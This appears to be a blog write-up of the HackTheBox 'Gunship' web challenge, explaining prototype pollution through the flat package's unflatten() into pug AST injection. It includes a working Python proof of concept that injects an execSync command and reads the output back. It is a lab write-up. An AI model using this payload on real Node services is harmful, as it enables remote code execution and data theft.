---
layout: post
title: "Gunship (HTB web)"
subtitle: "prototype pollution through the flat package into a pug ast injection"
date: 2023-04-16
tags: [htb, ctf, web, prototype-pollution, ssti]
category: writeups
tldr: "An Express app ran unflatten() from the flat package on the raw request body, which let me set __proto__ keys. The same handler called pug.compile(), and pug walks the prototype chain when it builds its AST. I polluted __proto__.block with a fake Text node whose line was a JS expression, and pug executed it as code."
---

## the challenge

The app was a small Node/Express service. `index.js` set up `express.json()` and mounted the routes. The only interesting route was `/api/submit`:

```js
const { unflatten } = require('flat');

router.post('/api/submit', (req, res) => {
    const { artist } = unflatten(req.body);

    if (artist.name.includes('Haigh') || artist.name.includes('Westaway') || artist.name.includes('Gingell')) {
        return res.json({
            'response': pug.compile('span Hello #{user}, thank you for letting us know!')({ user: 'guest' })
        });
    } else {
        return res.json({
            'response': 'Please provide us with the full name of an existing member.'
        });
    }
});
```

## the bug

Two things lined up. `unflatten` from the `flat` package expands dotted keys back into nested objects, and it does not filter `__proto__`. So a body key like `__proto__.block` writes onto `Object.prototype`. That is prototype pollution straight from the request body.

The second thing is `pug.compile()`. To reach it I had to pass the name check, so `artist.name` had to contain one of `Haigh`, `Westaway`, or `Gingell`. When pug builds its AST it reads node properties off objects, and missing properties resolve up the prototype chain. If I pollute the prototype with a node that pug treats as part of the template, pug compiles my injected node into the generated function. This is the AST injection from blog.p6.is/AST-Injection.

## the solve

I sent both keys in one JSON body. `artist.name` is `Gingell` to clear the check. `__proto__.block` is a fake pug AST node of type `Text` whose `line` field is the JS I want to run:

```python
import requests

ENDPOINT = 'http://TARGET/api/submit'
OUTPUT   = 'http://TARGET/static/out'

requests.post(ENDPOINT, json={
    "artist.name": "Gingell",
    "__proto__.block": {
        "type": "Text",
        "line": "process.mainModule.require('child_process').execSync('ls > /app/static/out')"
    }
})

print(requests.get(OUTPUT).text)
```

When `pug.compile()` ran, it picked up the polluted `block` and emitted my `line` as code inside the compiled template function. `execSync` wrote the command output to `/app/static/out`, which the app serves under `/static`. Fetching `/static/out` gave me the result. Swapping `ls` for a read of the flag file and re-fetching `/static/out` printed it.

## the flag

The flag came back as the contents of `/static/out` after I pointed the `execSync` command at the flag file on disk.
